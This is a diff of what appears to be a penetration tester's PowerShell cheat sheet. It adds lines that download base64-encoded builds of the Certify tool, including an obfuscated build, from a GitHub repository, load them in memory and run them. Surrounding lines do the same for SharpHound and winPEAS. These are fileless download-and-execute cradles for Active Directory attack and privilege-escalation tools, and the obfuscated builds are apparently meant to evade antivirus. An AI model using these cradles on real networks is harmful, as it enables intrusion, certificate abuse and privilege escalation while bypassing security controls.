@@ -29,6 +29,11 @@ $b64 = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ptc-fberger/pub
 [System.Reflection.Assembly]::Load([Convert]::FromBase64String($b64))
 [SharpHound.Program]::Main("-h".Split())
 
+## Certify non obfusqué
+$b64 = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ptc-fberger/obfuscated/refs/heads/main/default/Certify.b64" -UseBasicParsing | Select-Object -ExpandProperty Content
+[System.Reflection.Assembly]::Load([Convert]::FromBase64String($b64))
+[Certify.Program]::Main("--help".Split())
+
 ## winpeas obfusqué
 $b64 = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ptc-fberger/obfuscated/refs/heads/main/obfuscated/winPEAS.b64" -UseBasicParsing | Select-Object -ExpandProperty Content
 [System.Reflection.Assembly]::Load([Convert]::FromBase64String($b64))
@@ -47,6 +52,10 @@ $b64 = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ptc-fberger/obf
 [System.Reflection.Assembly]::Load([Convert]::FromBase64String($b64))
 [SharpHound.Program]::Main("-h".Split())
 
+## Certify non obfusqué
+$b64 = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ptc-fberger/obfuscated/refs/heads/main/obfuscated/Certify.b64" -UseBasicParsing | Select-Object -ExpandProperty Content
+[System.Reflection.Assembly]::Load([Convert]::FromBase64String($b64))
+[Certify.Program]::Main("--help".Split())
 
 # Script ps1
 ## Sharphound
